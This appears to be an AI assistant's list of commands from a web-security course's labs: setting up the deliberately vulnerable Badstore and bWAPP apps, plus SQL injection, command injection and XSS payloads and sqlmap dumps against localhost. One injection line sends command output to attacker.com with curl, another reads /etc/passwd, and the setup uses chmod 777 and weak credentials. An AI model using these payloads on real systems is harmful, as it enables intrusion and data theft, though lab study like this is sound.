Here are the **pure command/code lines only** (no text explanations) from the labs in your `was.pdf`, organized for quick use:

---

### ✅ **LAB 4 – Badstore Docker**

```bash
docker pull jvhoof/badstore-docker
docker run -d -p 80:80 jvhoof/badstore-docker
```

---

### ✅ **LAB 6 – bWAPP Docker**

```bash
docker pull hackersploit/bwapp-docker
docker run -d -p 80:80 hackersploit/bwapp-docker
```

**Install in browser:**

```
http://127.0.0.1/install.php
```

---

### ✅ **LAB 7 – bWAPP Login**

```
Username: bee
Password: bug
```

---

### ✅ **LAB 10–13 – bWAPP Manual Installation**

```bash
sudo apt-get update -y
cd ~/Downloads
mkdir bwapp
ls
mv bWAPPv2.2.zip bwapp
cd bwapp
unzip bWAPPv2.2.zip
rm bWAPPv2.2.zip
mysql -V
sudo apt install mysql-server
sudo systemctl start mysql
sudo systemctl enable mysql
sudo systemctl status mysql
apache2 -v
sudo apt install apache2
sudo systemctl start apache2
sudo systemctl enable apache2
sudo systemctl status apache2
cd BWA*/  # Adjust directory name if needed
chmod 777 passwords/
chmod 777 images/
chmod 777 documents/
sudo mysql
CREATE USER 'ahmed'@'localhost' IDENTIFIED BY 'pass123';
GRANT ALL PRIVILEGES ON bWAPP.* TO 'ahmed'@'localhost';
FLUSH PRIVILEGES;
exit
mousepad admin/settings.php
# Edit inside:
# $db_username = "ahmed";
# $db_password = "pass123";
mousepad install.php
# Replace content with copied install code
cd ../
sudo mv * /var/www/html/
```

**Finish installation in browser:**

```
http://localhost/bWAPP/install.php
```

```bash
sudo mysql
SHOW DATABASES;
exit
```

**Login:**

```
http://localhost/bWAPP/
Username: bee
Password: bug
```

---

### ✅ **LAB 17 – SQLi Payloads**

```sql
' OR '1'='1 --
' OR 1=1 --
admin' --
' OR 'a'='a
1' AND extractvalue(1, concat(0x7e, version())) --
1' AND updatexml(null, concat(0x3a, database()), null) --
' UNION SELECT null, version(), user() --
' UNION SELECT 1, database(), 3 --
' OR IF(1=1, SLEEP(5), 0) --
' AND SLEEP(5) --
```

---

### ✅ **LAB 18 – Command Injection**

```
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | uname -a
127.0.0.1; cat /etc/passwd
127.0.0.1 && curl http://attacker.com?`whoami`
127.0.0.1 | sleep 5 | ls
127.0.0.1 && ping -c 5 127.0.0.1
127.0.0.1 || sleep 10
```

---

### ✅ **LAB 19 – XSS Payloads**

```html
<script>alert(1)</script>
<img src=x onerror=alert('XSS')>
<a href="javascript:alert(1)">Click me</a>
<input onmouseover="alert('XSS')" autofocus>
<body onload=alert('XSS')>
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg/onload=alert('XSS')>
```

---

### ✅ **LAB 20–21 – SQLMap Commands**

```bash
sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" --cookie="PHPSESSID=your-session-id" --batch --random-agent

sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" \
--cookie="PHPSESSID=your-session-id" \
--level=5 --risk=3 --batch --random-agent

sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" \
--cookie="PHPSESSID=your-session-id" \
--batch --random-agent --dbs

sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" \
--cookie="PHPSESSID=your-session-id" \
--batch --random-agent -D bwapp --tables

sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" \
--cookie="PHPSESSID=your-session-id" \
--batch --random-agent -D bwapp -T users --dump
```

**Using request file from Burp Suite:**

```bash
sqlmap -r request.txt --batch --random-agent
```

---

Let me know if you want:

* A script to run all of this at once
* Dockerfile to build your own vulnerable app image
* Additional payloads or attacks
